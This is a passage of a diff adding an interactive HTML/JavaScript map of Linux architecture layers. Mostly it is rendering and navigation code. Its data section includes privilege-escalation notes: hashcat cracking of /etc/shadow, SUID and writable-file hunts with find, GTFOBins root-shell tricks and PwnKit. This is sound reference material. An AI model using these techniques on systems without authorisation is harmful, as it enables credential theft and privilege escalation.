+    { name:'CAP_NET_ADMIN (12)', desc:'Configure network interfaces, iptables, tc', purpose:'Required for ip, tc, iptables, bridge management' },
+    { name:'CAP_DAC_OVERRIDE (1)', desc:'Bypass file read/write/execute DAC checks', purpose:'Read any file regardless of permissions — extremely dangerous' },
+  ]},
+],
+
+dac_node: [
+  { path:'/etc/', desc:'Core identity and permission files', children:[
+    { name:'passwd', desc:'User accounts (world-readable)', purpose:'Check for UID=0 entries beyond root:\nawk -F: "($3==0){print}" /etc/passwd' },
+    { name:'shadow', desc:'Password hashes (root-readable only, mode 640)', purpose:'$6$=SHA-512 $5$=SHA-256 $1$=MD5(INSECURE)\ncrack with: hashcat -m 1800 shadow.txt rockyou.txt' },
+    { name:'group', desc:'Group memberships', purpose:'Check: getent group sudo; getent group docker\ndocker group == root equivalent!' },
+    { name:'sudoers', desc:'sudo policy (see sudo node)', purpose:'NOPASSWD entries are high-value targets' },
+    { name:'gshadow', desc:'Group passwords (root-readable)', purpose:'Rarely used; check for unexpected admin members' },
+  ]},
+  { path:'SUID binary hunt', desc:'Find privileged SUID/SGID executables', children:[
+    { name:'find / -perm -4000 -type f 2>/dev/null', desc:'All SUID root binaries on filesystem', purpose:'Cross-reference with GTFOBins.github.io\nCommon finds: /usr/bin/sudo, /usr/bin/pkexec, /usr/bin/passwd' },
+    { name:'find / -perm -2000 -type f 2>/dev/null', desc:'All SGID binaries', purpose:'Less exploitable but worth checking (write, crontab, wall)' },
+    { name:'find / -writable -type f -not -path "/proc/*" 2>/dev/null', desc:'World-writable files', purpose:'Config, cron scripts, PATH dirs → instant LPE if writable' },
+  ]},
+  { path:'/usr/bin/ and /bin/', desc:'Common SUID binaries (legitimate)', children:[
+    { name:'sudo', desc:'Execute commands as another user per sudoers', purpose:'GTFOBin: sudo /bin/bash → root shell if allowed' },
+    { name:'passwd', desc:'Change user password (writes to /etc/shadow)', purpose:'SUID needed to write root-owned shadow file' },
+    { name:'su', desc:'Switch user (reads /etc/shadow)', purpose:'GTFOBin: su root → root shell with password' },
+    { name:'pkexec', desc:'PolicyKit command executor', purpose:'CVE-2021-4034 (PwnKit): local → root regardless of sudoers' },
+    { name:'newgrp', desc:'Switch effective group', purpose:'GTFOBin: if can write .bashrc, newgrp → new shell with group' },
+    { name:'mount / umount', desc:'Mount filesystems (legacy SUID)', purpose:'Mostly no longer SUID on modern systems (use user_allow_other in fuse)' },
+  ]},
+],
+
+};
+
+// ══════════════════════════════════════════
+//  CANONICAL ARCHITECTURE PATH (BFS)
+//  Find shortest path from any HW node to target using directed EDGES
+// ══════════════════════════════════════════
+function buildGraph(){
+  // directed adjacency: for each edge a→b, a is "closer to hardware"
+  // We want to find paths from HW-layer nodes UP to any target
+  const adj = {};
+  NODES.forEach(n=>adj[n.id]=[]);
+  EDGES.forEach(e=>{
+    // primary direction: e.a → e.b (lower layer to higher layer generally)
+    if(!adj[e.a]) adj[e.a]=[];
+    if(!adj[e.b]) adj[e.b]=[];
+    adj[e.a].push(e.b);
+    // also allow reverse for cross-layer xref edges (same-layer edges)
+    const la = LAYER_MAP[NODE_MAP[e.a]?.layer]?.wy||0;
+    const lb = LAYER_MAP[NODE_MAP[e.b]?.layer]?.wy||0;
+    if(Math.abs(la-lb) < 50) { // same-layer or very close → bidirectional
+      adj[e.b].push(e.a);
+    }
+  });
+  return adj;
+}
+
+const GRAPH = buildGraph();
+
+// Layer depth order: hw=0, kernel=1, driver=2, libs=3, user=4, sec=5, gui=6
+const LAYER_DEPTH = {hw:0,kernel:1,driver:2,libs:3,user:4,sec:5,gui:6};
+
+function findArchPath(targetId){
+  if(!targetId) return [];
+  const targetNode = NODE_MAP[targetId];
+  if(!targetNode) return [targetId];
+
+  // BFS from ALL hw nodes simultaneously; find shortest path to target
+  // Use bidirectional search: BFS from HW roots downward OR BFS from target upward
+  // We'll do BFS from target, going "toward hardware" by following reverse edges
+
+  // Build reverse graph
+  const rev = {};
+  NODES.forEach(n=>rev[n.id]=[]);
+  EDGES.forEach(e=>{
+    if(!rev[e.b]) rev[e.b]=[];
+    if(!rev[e.a]) rev[e.a]=[];
+    rev[e.b].push(e.a); // reverse: b→a
+    const la=LAYER_MAP[NODE_MAP[e.a]?.layer]?.wy||0;
+    const lb=LAYER_MAP[NODE_MAP[e.b]?.layer]?.wy||0;
+    if(Math.abs(la-lb)<50) rev[e.a].push(e.b); // bidirectional for same-layer
+  });
+
+  // BFS from target through reverse edges toward hw roots
+  const visited = {[targetId]:true};
+  const parent = {[targetId]:null};
+  const queue = [targetId];
+  let found = null;
+
+  while(queue.length && !found){
+    const curr = queue.shift();
+    const currDepth = LAYER_DEPTH[NODE_MAP[curr]?.layer]||99;
+    // reached hardware layer
+    if(currDepth === 0){ found=curr; break; }
+    (rev[curr]||[]).forEach(nb=>{
+      if(!visited[nb]){
+        visited[nb]=true;
+        parent[nb]=curr;
+        queue.push(nb);
+        if(LAYER_DEPTH[NODE_MAP[nb]?.layer]===0) found=nb;
+      }
+    });
+  }
+
+  if(!found){
+    // No hw root found — just return layer-based path
+    const layerPath = LAYERS.slice().reverse() // gui→hw order
+      .filter(l=>LAYER_DEPTH[l.id] <= LAYER_DEPTH[NODE_MAP[targetId]?.layer||'hw'])
+      .map(l=>{ const n=NODES.find(x=>x.layer===l.id); return n?n.id:null; })
+      .filter(Boolean);
+    // return unique layer representatives ending at target
+    const path = [];
+    layerPath.forEach(id=>{ if(!path.includes(id)) path.push(id); });
+    if(!path.includes(targetId)) path.push(targetId);
+    return path;
+  }
+
+  // Reconstruct path from found hw root to target
+  const path = [];
+  let cur = found;
+  while(cur !== null){
+    path.unshift(cur);
+    cur = parent[cur];
+  }
+  return path;
+}
+
+// ══════════════════════════════════════════
+//  RENDER SETUP
+// ══════════════════════════════════════════
+const svg = document.getElementById('svg');
+const NS = 'http://www.w3.org/2000/svg';
+
+function el(tag, attrs={}, parent=null){
+  const e = document.createElementNS(NS, tag);
+  for(const [k,v] of Object.entries(attrs)) e.setAttribute(k,v);
+  if(parent) parent.appendChild(e);
+  return e;
+}
+
+// ── Build SVG DOM ──
+const defs = el('defs',{},svg);
+// subtle grid pattern
+const pat = el('pattern',{id:'grid',width:60,height:60,patternUnits:'userSpaceOnUse'},defs);
+el('path',{d:'M 60 0 L 0 0 0 60',fill:'none',stroke:'rgba(255,255,255,0.028)','stroke-width':'0.5'},pat);
+
+const vpGroup = el('g',{id:'vp'},svg);  // pan/zoom group
+
+// layer bands
+const bandsG = el('g',{id:'bands'},vpGroup);
+const edgesG = el('g',{id:'edges'},vpGroup);
+const nodesG = el('g',{id:'nodes'},vpGroup);
+
+// world background — pointer-events:none so it never intercepts node clicks
+el('rect',{x:-5000,y:-5000,width:12000,height:10000,fill:'url(#grid)','pointer-events':'none'},vpGroup);
+
+// ── Layer bands ──
+const BAND_H = 160;
+LAYERS.forEach(L=>{
+  el('rect',{
+    x:-2000, y:L.wy - BAND_H*0.5,
+    width:8000, height:BAND_H,
+    fill: hexAlpha(L.color,0.032),
+    rx:0, 'pointer-events':'none'
+  },bandsG);
+  // separator line
+  el('line',{
+    x1:-2000, y1: L.wy - BAND_H*0.5,
+    x2: 6000, y2: L.wy - BAND_H*0.5,
+    stroke: hexAlpha(L.color,0.1),
+    'stroke-width': 0.5,
+    'stroke-dasharray':'4 8',
+    'pointer-events':'none'
+  },bandsG);
+});
+
+// ── Build edges ──
+const edgePaths = {};
+EDGES.forEach((e,i)=>{
+  const A=NODE_MAP[e.a], B=NODE_MAP[e.b];
+  if(!A||!B) return;
+  const ax=A.wx, ay=A.wy, bx=B.wx, by=B.wy;
+  const midY=(ay+by)/2;
+  const d=`M ${ax} ${ay+NH*0.5} C ${ax} ${midY}, ${bx} ${midY}, ${bx} ${by-NH*0.5}`;
+  const p=el('path',{
+    d,fill:'none',
+    stroke:'rgba(255,255,255,0.07)',
+    'stroke-width':'1',
+    'stroke-linecap':'round',
+    'pointer-events':'none',
+    class:'edge'
+  },edgesG);
+  edgePaths[`${e.a}|${e.b}`]=p;
+  edgePaths[`${e.b}|${e.a}`]=p;
+});
+
+// ── Build node rects ──
+const nodeEls = {};
+NODES.forEach(n=>{
+  const c = lc(n.layer);
+  const g = el('g',{
+    class:'node',
+    transform:`translate(${n.wx-NW/2},${n.wy-NH/2})`,
+    'data-id':n.id,
+    'pointer-events':'all',
+    style:'cursor:pointer'
+  },nodesG);
+
+  // background rect — explicit fill so hit-testing always works
+  el('rect',{
+    x:0,y:0,width:NW,height:NH,rx:4,
+    fill:hexAlpha(c,0.07),
+    stroke:hexAlpha(c,0.5),
+    'stroke-width':'1',
+    class:'nrect'
+  },g);
+
+  // top colored stripe
+  el('rect',{x:0,y:0,width:NW,height:3,rx:0,fill:hexAlpha(c,0.7),'pointer-events':'none'},g);
+
+  // label
+  const t=el('text',{
+    x: NW/2, y: NH/2+4,
+    'text-anchor':'middle',
+    fill:'#e2e8f0',
+    'font-size':'11',
+    'font-weight':'600',
+    'font-family':'Share Tech Mono, monospace',
+    'dominant-baseline':'middle',
+    'pointer-events':'none'
+  },g);
+  t.textContent = n.label;
+
+  // hover only — click handled by unified mouseup on mapWrap
+  g.addEventListener('mouseenter',()=>hoverNode(n.id));
+  g.addEventListener('mouseleave',()=>hoverNode(null));
+
+  nodeEls[n.id]=g;
+});
+
+// ══════════════════════════════════════════
+//  LEGEND
+// ══════════════════════════════════════════
+const legend = document.getElementById('legend');
+LAYERS.forEach(L=>{
+  legend.innerHTML += `<div class="li"><div class="ld" style="background:${L.color}"></div>${L.label}</div>`;
+});
+
+// ══════════════════════════════════════════
+//  LAYER LABELS (HTML overlay, tracks transform)
+// ══════════════════════════════════════════
+const llabels = document.getElementById('llabels');
+const labelEls = {};
+LAYERS.forEach(L=>{
+  const d = document.createElement('div');
+  d.className='ll';
+  d.style.borderColor = L.color;
+  d.innerHTML=`<div class="ll-dot" style="background:${L.color}"></div><span style="color:${L.color}">${L.label}</span>`;
+  llabels.appendChild(d);
+  labelEls[L.id]=d;
+});
+
+// ══════════════════════════════════════════
+//  PAN / ZOOM
+// ══════════════════════════════════════════
+let vp = {x:0,y:0,scale:1};
+let showLinks=true, highlightPath=true;
+let selectedId=null, hoveredId=null;
+let navHistory=[];
+
+function applyVP(){
+  vpGroup.setAttribute('transform',`translate(${vp.x},${vp.y}) scale(${vp.scale})`);
+  updateLayerLabels();
+}
+
+function worldToScreen(wx,wy){
+  const wrap=document.getElementById('map-wrap').getBoundingClientRect();
+  return [wx*vp.scale+vp.x, wy*vp.scale+vp.y];
+}
+
+function updateLayerLabels(){
+  const wrap=document.getElementById('map-wrap');
+  const H=wrap.getBoundingClientRect().height;
+  LAYERS.forEach(L=>{
+    const sy = L.wy * vp.scale + vp.y;
+    const el=labelEls[L.id];
+    el.style.top=`${sy}px`;
+    // hide if outside viewport
+    el.style.opacity=(sy<0||sy>H)?'0':'1';
+  });
+}
+
+const svgEl=document.getElementById('svg');
+const mapWrap=document.getElementById('map-wrap');
+
+// ── Pan & Click — threshold-based ──
+// We track mousedown position. If user moves > DRAG_THRESHOLD pixels, it's a drag.
+// If they release without exceeding threshold, it's a click → check for node via elementFromPoint.
+const DRAG_THRESHOLD = 5;
+let dragState = null; // {sx, sy, ox, oy, moved}
+
+mapWrap.addEventListener('wheel',e=>{
+  e.preventDefault();
+  const rect=mapWrap.getBoundingClientRect();
+  const mx=e.clientX-rect.left, my=e.clientY-rect.top;
+  const factor=e.deltaY<0?1.1:0.91;
+  const newScale=Math.min(4,Math.max(0.2,vp.scale*factor));
+  vp.x=mx-(mx-vp.x)*(newScale/vp.scale);
+  vp.y=my-(my-vp.y)*(newScale/vp.scale);
+  vp.scale=newScale;
+  applyVP();
+},{passive:false});
+
+mapWrap.addEventListener('mousedown',e=>{
+  dragState={sx:e.clientX,sy:e.clientY,ox:vp.x,oy:vp.y,moved:false};
+});
+
+window.addEventListener('mousemove',e=>{
+  if(!dragState) return;
+  const dist=Math.hypot(e.clientX-dragState.sx, e.clientY-dragState.sy);
+  if(dist > DRAG_THRESHOLD){
+    dragState.moved=true;
+    vp.x=dragState.ox+(e.clientX-dragState.sx);
+    vp.y=dragState.oy+(e.clientY-dragState.sy);
+    mapWrap.style.cursor='grabbing';
+    applyVP();
+  }
+});
+
+window.addEventListener('mouseup',e=>{
+  if(dragState && !dragState.moved){
+    // it's a click — find node via elementFromPoint (100% reliable in SVG)
+    const hit=document.elementFromPoint(e.clientX, e.clientY);
+    if(hit){
+      const nodeG=hit.closest('[data-id]');
+      if(nodeG) selectNode(nodeG.getAttribute('data-id'));
+    }
+  }
+  dragState=null;
+  mapWrap.style.cursor='default';
+});
+
+// touch
+let lastTD=null;
+let touchDragState=null;
+mapWrap.addEventListener('touchstart',e=>{
+  if(e.touches.length===2){
+    lastTD=Math.hypot(e.touches[0].clientX-e.touches[1].clientX,e.touches[0].clientY-e.touches[1].clientY);
+    touchDragState=null;
+  } else if(e.touches.length===1){
+    const t=e.touches[0];
+    touchDragState={sx:t.clientX,sy:t.clientY,ox:vp.x,oy:vp.y,moved:false};
+  }
+},{passive:true});
+
+mapWrap.addEventListener('touchmove',e=>{
+  if(e.touches.length===2&&lastTD){
+    const d=Math.hypot(e.touches[0].clientX-e.touches[1].clientX,e.touches[0].clientY-e.touches[1].clientY);
+    const rect=mapWrap.getBoundingClientRect();
+    const mx=(e.touches[0].clientX+e.touches[1].clientX)/2-rect.left;
+    const my=(e.touches[0].clientY+e.touches[1].clientY)/2-rect.top;
+    const factor=d/lastTD;
+    const ns=Math.min(4,Math.max(0.2,vp.scale*factor));
+    vp.x=mx-(mx-vp.x)*(ns/vp.scale);
+    vp.y=my-(my-vp.y)*(ns/vp.scale);
+    vp.scale=ns; lastTD=d; applyVP();
+  } else if(e.touches.length===1&&touchDragState){
+    const t=e.touches[0];
+    const dist=Math.hypot(t.clientX-touchDragState.sx, t.clientY-touchDragState.sy);
+    if(dist > DRAG_THRESHOLD){
+      touchDragState.moved=true;
+      vp.x=touchDragState.ox+(t.clientX-touchDragState.sx);
+      vp.y=touchDragState.oy+(t.clientY-touchDragState.sy);
+      applyVP();
+    }
+  }
+},{passive:true});
+
+mapWrap.addEventListener('touchend',e=>{
+  if(touchDragState && !touchDragState.moved && e.changedTouches.length===1){
+    const t=e.changedTouches[0];
+    const hit=document.elementFromPoint(t.clientX, t.clientY);
+    if(hit){
+      const nodeG=hit.closest('[data-id]');
+      if(nodeG) selectNode(nodeG.getAttribute('data-id'));
+    }
+  }
+  touchDragState=null; lastTD=null;
+});
+
+// ══════════════════════════════════════════
+//  NODE INTERACTION
+// ══════════════════════════════════════════
+function getRelatedIds(id){
+  const n=NODE_MAP[id]; if(!n) return new Set();
+  const rel=new Set([id]);
+  (n.related||[]).forEach(r=>rel.add(r));
+  EDGES.forEach(e=>{
+    if(e.a===id) rel.add(e.b);
+    if(e.b===id) rel.add(e.a);
+  });
+  return rel;
+}
+
+function hoverNode(id){
+  hoveredId=id;
+  updateNodeStyles();
+}
+
+function updateNodeStyles(){
+  const relSet = selectedId ? getRelatedIds(selectedId) : null;
+  NODES.forEach(n=>{
+    const g=nodeEls[n.id];
+    const rect=g.querySelector('.nrect');
+    const c=lc(n.layer);
+    const isSel=n.id===selectedId;
+    const isHov=n.id===hoveredId;
+    const isRel=relSet&&relSet.has(n.id);
+    const dimmed=relSet&&!relSet.has(n.id)&&!isHov;
+
+    rect.setAttribute('fill', hexAlpha(c, isSel?0.2:isHov?0.12:0.07));
+    rect.setAttribute('stroke', hexAlpha(c, isSel?1:isHov?0.85:isRel?0.65:dimmed?0.15:0.5));
+    rect.setAttribute('stroke-width', isSel?'2':isHov?'1.5':'1');
+    g.style.opacity=dimmed?'0.28':'1';
+
+    // glow effect via filter for selected
+    if(isSel){
+      rect.setAttribute('filter',`drop-shadow(0 0 6px ${hexAlpha(c,0.6)})`);
+    } else {
+      rect.removeAttribute('filter');
+    }
+  });
+
+  // update edges
+  for(const [key,p] of Object.entries(edgePaths)){
+    if(!showLinks){p.setAttribute('stroke','none');continue;}
+    const [a,b]=key.split('|');
+    const active=relSet&&relSet.has(a)&&relSet.has(b);
+    p.setAttribute('stroke',active?hexAlpha(lc(NODE_MAP[a]?.layer||'hw'),0.5):'rgba(255,255,255,0.07)');
+    p.setAttribute('stroke-width',active?'1.5':'0.7');
+  }
+}
+
+function selectNode(id,addHist=true){
+  selectedId=id;
+  updateNodeStyles();
+  renderBreadcrumb();
+  if(id) renderPanel(NODE_MAP[id]);
+  else closePanel();
+}
+
+function jumpTo(id){
+  const n=NODE_MAP[id]; if(!n) return;
+  const wrap=document.getElementById('map-wrap');
+  const W=wrap.clientWidth, H=wrap.clientHeight;
+  const tx=W/2-n.wx*vp.scale;
+  const ty=H/2-n.wy*vp.scale;
+  // animate
+  const ox=vp.x,oy=vp.y;
+  const dx=tx-ox,dy=ty-oy;
+  let t=0; const steps=20;
+  const anim=()=>{
+    t++;
+    const p=1-Math.pow(1-t/steps,3);
+    vp.x=ox+dx*p; vp.y=oy+dy*p;
+    applyVP();
+    if(t<steps) requestAnimationFrame(anim);
+    else selectNode(id);
+  };
+  requestAnimationFrame(anim);
+}
+
+// ── Breadcrumb — shows canonical ARCHITECTURE PATH to selected node ──
+function renderBreadcrumb(){
+  const bc=document.getElementById('bc');
+  if(!selectedId){bc.innerHTML='<span class="bc-empty">// click a node to see its architecture path</span>';return;}
+
+  const path = findArchPath(selectedId);
+  if(!path.length){bc.innerHTML='<span class="bc-empty">// no path found</span>';return;}
+
+  bc.innerHTML = path.map((id,i)=>{
+    const n=NODE_MAP[id]; if(!n) return '';
+    const c=lc(n.layer);
+    const layer=LAYER_MAP[n.layer];
+    const isCurrent = id===selectedId;
+    return `<div class="bc-item">
+      ${i?`<span class="bc-sep">›</span>`:''}
+      <span style="font-family:'Share Tech Mono';font-size:.52rem;color:${hexAlpha(c,0.4)};padding:0 2px 0 ${i?'0':'2px'};letter-spacing:1px;">${layer?.label||''}</span>
+      <span class="bc-node" onclick="jumpTo('${id}')"
+        style="color:${isCurrent?c:hexAlpha(c,0.65)};font-weight:${isCurrent?700:400};background:${isCurrent?hexAlpha(c,0.08):'transparent'};border-radius:3px;"
+      >${n.label}</span>
+    </div>`;
+  }).join('');
+}
+
+// ── Filesystem Path Tree renderer ──
+let fsTreeCounter = 0;
+function renderFsTree(entries, nodeId){
+  if(!entries||!entries.length) return '';
+  let h = `<div class="fs-tree">`;
+  entries.forEach((dir, di)=>{
+    const tid = `fst_${nodeId}_${di}`;
+    h += `
+    <div class="fs-dir-row" onclick="toggleFsDir('${tid}')">
+      <span class="fs-dir-toggle" id="tgl_${tid}">▸</span>
+      <span class="fs-dir-path">${escH(dir.path)}</span>
+      <span class="fs-dir-desc">${escH(dir.desc)}</span>
+    </div>
+    <div id="${tid}" class="fs-children">
+      ${renderFsChildren(dir.children||[], nodeId+'_'+di, 0)}
+    </div>`;
+  });
+  h += `</div>`;
+  return h;
+}
+
+function renderFsChildren(items, prefix, depth){
+  if(!items||!items.length) return '';
+  let h='';
+  items.forEach((item,i)=>{
+    const tid=`fsc_${prefix}_${depth}_${i}`;
+    const hasKids = item.children&&item.children.length>0;
+    const indent = depth*10;
+    if(hasKids){
+      // sub-directory row
+      h += `
+      <div class="fs-subdir-row" onclick="toggleFsDir('${tid}')" style="padding-left:${8+indent}px">
+        <span class="fs-subdir-toggle" id="tgl_${tid}">▸</span>
+        <span class="fs-subdir-name">${escH(item.name)}</span>
+        <span class="fs-subdir-desc">${escH(item.desc||'')}</span>
+      </div>
+      <div id="${tid}" class="fs-grandchildren">
+        ${renderFsChildren(item.children, prefix+'_'+i, depth+1)}
+      </div>`;
+    } else {
+      // file row
+      const purposeLines = (item.purpose||'').split('\n').filter(Boolean);
+      h += `
+      <div class="fs-file-row" style="padding-left:${10+indent}px">
+        <span class="fs-file-icon">▪</span>
+        <div>
+          <div class="fs-fname">${escH(item.name)}</div>
+          <div class="fs-fdesc">${escH(item.desc||'')}${purposeLines.length?`<div class="fs-fpurpose">${purposeLines.map(escH).join('<br>')}</div>`:''}</div>
+        </div>
+      </div>`;
+    }
+  });
+  return h;
+}
+
+function toggleFsDir(id){
+  const el=document.getElementById(id);
+  const tgl=document.getElementById('tgl_'+id);
+  if(!el) return;
+  const open=el.classList.contains('open');
+  el.classList.toggle('open',!open);
+  if(tgl) tgl.textContent=open?'▸':'▾';
+}
+
+function escH(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+// ── Panel ──
+function renderPanel(node){
+  const c=lc(node.layer);
+  const L=LAYER_MAP[node.layer];
+  document.getElementById('p-title').textContent=node.label;
+  document.getElementById('p-title').style.color=c;
+  document.getElementById('p-ltag').textContent=L?.label||'';
+  document.getElementById('p-ltag').style.color=c;
+  document.getElementById('p-desc').textContent=node.desc;
+
+  const paths=node.paths||{};
+  let html='';
+
+  // ARCH PATH — same as breadcrumb but shown in panel with layer badges
+  const archPath = findArchPath(node.id);
+  if(archPath.length > 1){
+    html += `<div class="sh">◈ ARCHITECTURE PATH</div>
+    <div style="display:flex;align-items:center;flex-wrap:wrap;gap:3px;padding:6px 8px;background:rgba(255,255,255,.02);border:1px solid var(--border);border-radius:3px;margin-bottom:2px;">`;
+    archPath.forEach((id,i)=>{
+      const n=NODE_MAP[id]; if(!n) return;
+      const nc=lc(n.layer);
+      const isCur=id===node.id;
+      html += `${i?`<span style="color:#1e3a5f;padding:0 1px;">›</span>`:''}
+      <span onclick="jumpTo('${id}')" style="font-family:'Share Tech Mono';font-size:.6rem;cursor:pointer;
+        color:${isCur?nc:hexAlpha(nc,0.6)};padding:2px 6px;border-radius:2px;
+        background:${isCur?hexAlpha(nc,0.1):'transparent'};
+        border:1px solid ${isCur?hexAlpha(nc,0.4):'transparent'};
+        font-weight:${isCur?700:400};transition:.12s;" onmouseover="this.style.background='${hexAlpha(nc,0.08)}'" onmouseout="this.style.background='${isCur?hexAlpha(nc,0.1):'transparent'}'">
+        ${n.label}
+      </span>`;
+    });
+    html += `</div>`;
+  }
+
+  // NODE PATHS (up/down/xref)
+  if((paths.up?.length||paths.down?.length||paths.xref?.length)){
+    html+=`<div class="sh">⇅ NODE CONNECTIONS</div><div class="path-box">`;
+    const pathRow=(label,cls,ids)=>ids?.length?`<div class="path-row">
+      <span class="pd ${cls}">${label}</span>
+      <div class="pchips">${ids.map(id=>{
+        const n=NODE_MAP[id]; if(!n) return '';
+        const nc=lc(n.layer);
+        return `<span class="pchip" onclick="jumpTo('${id}')" style="border-color:${nc};color:${nc};">${n.label}</span>`;
+      }).join('')}</div></div>`:'' ;
+    html+=pathRow('↑ FROM','pd-up',paths.up);
+    html+=pathRow('↓ TO','pd-down',paths.down);
+    html+=pathRow('↔ XREF','pd-xref',paths.xref);
+    html+=`</div>`;
+  }
+
+  // FILESYSTEM PATHS
+  const fsPaths = FS_PATHS[node.id];
+  if(fsPaths&&fsPaths.length){
+    html+=`<div class="sh" style="color:#ffd60a;">📁 FILESYSTEM PATHS</div>`;
+    html+=renderFsTree(fsPaths, node.id);
+  }
+
+  // COMPONENTS
+  if(node.components?.length){
+    html+=`<div class="sh">⬡ COMPONENTS</div><div class="cl">`;
+    node.components.forEach((comp,ci)=>{
+      const linked=comp.lk?NODE_MAP[comp.lk]:null;
+      const lnkColor=linked?lc(linked.layer):c;
+      const hasSub=comp.s?.length>0;
+      const xid=`x${node.id}${ci}`;
+      html+=`<div class="ci${hasSub||linked?' clk':''}" onclick="ciClick('${xid}',${hasSub?1:0},'${comp.lk||''}')"
+        style="border-left-color:${hexAlpha(c,0.6)};">
+        <span class="ci-label">${comp.l}</span>
+        <div class="ci-right">
+          ${linked?`<span class="clink" style="border-color:${lnkColor};color:${lnkColor};" onclick="event.stopPropagation();jumpTo('${comp.lk}')">→${linked.label}</span>`:''}
+          ${hasSub?`<span class="carrow" id="ca${xid}">▸</span>`:''}
+        </div>
+      </div>`;
+      if(hasSub){
+        html+=`<div id="${xid}" class="sub-block" style="display:none">`;
+        comp.s.forEach(s=>{
+          const mn=NODES.find(x=>s.startsWith(x.label));
+          html+=`<div class="sub-item" onclick="${mn?`jumpTo('${mn.id}')`:''}">${s}</div>`;
+        });
+        html+=`</div>`;
+      }
+    });
+    html+=`</div>`;
+  }
+
+  // SECURITY
+  if(node.security?.length){
+    html+=`<div class="sh" style="color:#ff4d6d;">⚠ ATTACK SURFACE</div>`;
+    html+=`<div><span class="sec-badge">CVEs / TECHNIQUES</span></div>`;
+    html+=node.security.map(s=>{
+      const cves=s.match(/CVE-\d{4}-\d+/g)||[];
+      let disp=escH(s);
+      cves.forEach(cve=>{
+        disp=disp.replace(cve,`<span style="color:#f87171;text-decoration:underline;cursor:pointer" onclick="window.open('https://nvd.nist.gov/vuln/detail/${cve}','_blank')">${cve}</span>`);
+      });
+      return `<div class="seci"><span>⚠</span><span>${disp}</span></div>`;
+    }).join('');
+  }
+
+  // RELATED
+  if(node.related?.length){
+    html+=`<div class="sh">○ RELATED</div><div class="rg">`;
+    html+=node.related.map(id=>{
+      const rn=NODE_MAP[id]; if(!rn) return '';
+      const rc=lc(rn.layer);
+      return `<span class="rc" onclick="jumpTo('${id}')" style="border-color:${rc};color:${rc};">${rn.label}</span>`;
+    }).join('');
+    html+=`</div>`;
+  }
+
+  document.getElementById('pbody').innerHTML=html;
+  document.getElementById('panel').classList.add('open');
+  document.getElementById('hint').classList.remove('panel-closed');
+}
+
+function ciClick(xid,hasSub,lk){
+  if(hasSub){
+    const el=document.getElementById(xid);
+    const arr=document.getElementById('ca'+xid);
+    if(el){const open=el.style.display!=='none';el.style.display=open?'none':'block';if(arr)arr.textContent=open?'▸':'▾';}
+  }
+}
+
+function closePanel(){
+  document.getElementById('panel').classList.remove('open');
+  document.getElementById('hint').classList.add('panel-closed');
+  selectedId=null;
+  renderBreadcrumb();
+  updateNodeStyles();
+}
+
+// ── Controls ──
+function zoom(f){
+  const wrap=document.getElementById('map-wrap');
+  const cx=wrap.clientWidth/2, cy=wrap.clientHeight/2;
+  const ns=Math.min(4,Math.max(0.2,vp.scale*f));
+  vp.x=cx-(cx-vp.x)*(ns/vp.scale);
+  vp.y=cy-(cy-vp.y)*(ns/vp.scale);
+  vp.scale=ns; applyVP();
+}
+
+function resetView(){
+  const wrap=document.getElementById('map-wrap');
+  const W=wrap.clientWidth, H=wrap.clientHeight;
+  const WORLD_W=1900, WORLD_H=1340;
+  const s=Math.min((W-130)/WORLD_W, H/WORLD_H)*0.88;
+  vp.scale=s;
+  vp.x=(W-(WORLD_W*s))/2+80;
+  vp.y=(H-(WORLD_H*s))/2;
+  applyVP();
+}
+
+function toggleLinks(){
+  showLinks=!showLinks;
+  const btn=document.getElementById('btn-links');
+  btn.classList.toggle('active',showLinks);
+  btn.textContent=showLinks?'LINKS':'LINKS';
+  updateNodeStyles();
+}
+
+function toggleHighlight(){
+  highlightPath=!highlightPath;
+  document.getElementById('btn-highlight').classList.toggle('active',highlightPath);
+}
+
+function clearPath(){
+  selectedId=null;
+  updateNodeStyles();
+  renderBreadcrumb();
+  document.getElementById('panel').classList.remove('open');
+  document.getElementById('hint').classList.add('panel-closed');
+}
+
+// ── Utils ──
+function hexAlpha(hex,a){
+  if(hex.startsWith('rgba')){
+    return hex.replace(/[\d.]+\)$/,`${a})`);
+  }
+  const r=parseInt(hex.slice(1,3),16),g=parseInt(hex.slice(3,5),16),b=parseInt(hex.slice(5,7),16);
+  return `rgba(${r},${g},${b},${a})`;
+}
+
+// ── Init ──
+window.addEventListener('resize',()=>{resetView();});
+resetView();
+updateNodeStyles();
+</script>
+</body>
+</html>
